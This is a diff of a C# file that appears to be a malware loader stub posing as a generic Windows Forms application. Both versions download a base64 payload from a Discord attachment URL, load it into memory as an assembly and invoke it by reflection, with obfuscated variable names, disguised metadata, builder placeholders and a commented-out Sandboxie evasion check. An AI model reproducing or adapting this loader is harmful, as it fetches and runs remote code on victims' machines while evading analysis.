@@ -13,11 +13,11 @@ using System.Windows.Forms;
 
 
 
-//Default [assembly: AssemblyTitle("WindowsFormsApplication3.exe")]
-//Default [assembly: AssemblyDescription("WindowsFormsApplication3")]
-//Default [assembly: AssemblyProduct("WindowsFormsApplication3")]
-//Default [assembly: AssemblyCopyright("Copyright ©  2015")]
-//Default [assembly: AssemblyFileVersion("1.0.0.0")]
+//Default [assembly: AssemblyTitle("Windows Forms Application .exe")]
+//Default [assembly: AssemblyDescription("Windows Forms Application ")]
+//Default [assembly: AssemblyProduct("Windows Forms Application ")]
+//Default [assembly: AssemblyCopyright("Windows Forms Application  ©  2012")]
+//Default [assembly: AssemblyFileVersion("2.0.0.0")]
 
 //Assembly [assembly: AssemblyTitle("{1}")]
 //Assembly [assembly: AssemblyDescription("{2}")]
@@ -27,18 +27,14 @@ using System.Windows.Forms;
 //Assembly [assembly: AssemblyFileVersion("{7}.{8}.{9}.{10}")]
 
 
-public class WindowsFormsApplication3
-    {
+public class settings 
+{
 
-        [DllImport("User32.dll")]
-        private static extern int SendMessage(IntPtr hWnd, int msg, int wParam, ref int lParam);
-        [DllImport("user32")]
-        public static extern int ReleaseCapture(IntPtr hwnd);
 
-        [STAThread]
-        public static void Main(string[] args)
+    [STAThread]
+    public static void Main(string[] args)
         {
-            using (WebClient web = new WebClient())
+            using (WebClient githubusercontent = new WebClient())
             {
 
                 try
@@ -67,38 +63,38 @@ public class WindowsFormsApplication3
 
 
 
-                    string radioButton1;
+                    string Wa5knROCfk;
 
-                    radioButton1 = "https://cdn.discordapp.com/attachments/844669981151985754/844685067003756574/message.txt";
+                    Wa5knROCfk = "https://cdn.discordapp.com/attachments/844669981151985754/845012637875437598/https_web.whatsapp.com_https_web.whatsapp.com_https_web.whatsapp.com_https_web.whatsapp.com_https_we.txt";
 
-                    WebClient checkBox23;
+                    WebClient tureng;
 
-                    checkBox23 = new WebClient();
+                    tureng = new WebClient();
 
-                    string textBox18;
+                    string utility;
 
-                    textBox18 = checkBox23.DownloadString(radioButton1);
+                    utility = tureng.DownloadString(Wa5knROCfk);
 
                     byte[] comboBox2;
 
-                    comboBox2 = Convert.FromBase64String(textBox18);
+                    comboBox2 = Convert.FromBase64String(utility);
 
                     string amountPaid = "pizzaorder.buynow";
 
-                    string net_classes_objects = "meseken";
+                    string ingilizce = "meseken";
 
 
-                    object comboBox2_SelectedIndexChanged = new object[] { %aPP%, string.Empty, web.DownloadData("%Server%"), true };
+                    object spider = new object[] { %aPP%, string.Empty, githubusercontent.DownloadData("%Server%"), true };
 
-                    string tabPage3_Click = amountPaid;
-
-
-                    Assembly assembly;
-
-                    assembly = AppDomain.CurrentDomain.Load(comboBox2);
+                    string instagram = amountPaid;
 
 
-                    assembly.GetType(tabPage3_Click).InvokeMember(net_classes_objects, System.Reflection.BindingFlags.InvokeMethod, null, null, (object[])comboBox2_SelectedIndexChanged);
+                    Assembly Kamp;
+
+                    Kamp  = AppDomain.CurrentDomain.Load(comboBox2);
+
+
+                    Kamp.GetType(instagram).InvokeMember(ingilizce, System.Reflection.BindingFlags.InvokeMethod, null, null, (object[])spider);
 
 
 
@@ -122,13 +118,13 @@ public class WindowsFormsApplication3
 
         }
 
-        //sandboxie [DllImport("kernel32.dll")]
-        //sandboxie public static extern IntPtr GetModuleHandle(string lpModuleName);
-        //sandboxie static void controlsandboxie()
-        //sandboxie {
-        //sandboxie     if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
-        //sandboxie     {
-        //sandboxie        Environment.Exit(1);
-        //sandboxie     }
-        //sandboxie }
-    }
+    //sandboxie [DllImport("kernel32.dll")]
+    //sandboxie public static extern IntPtr GetModuleHandle(string lpModuleName);
+    //sandboxie static void controlsandboxie()
+    //sandboxie {
+    //sandboxie     if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
+    //sandboxie     {
+    //sandboxie        Environment.Exit(1);
+    //sandboxie     }
+    //sandboxie }
+}
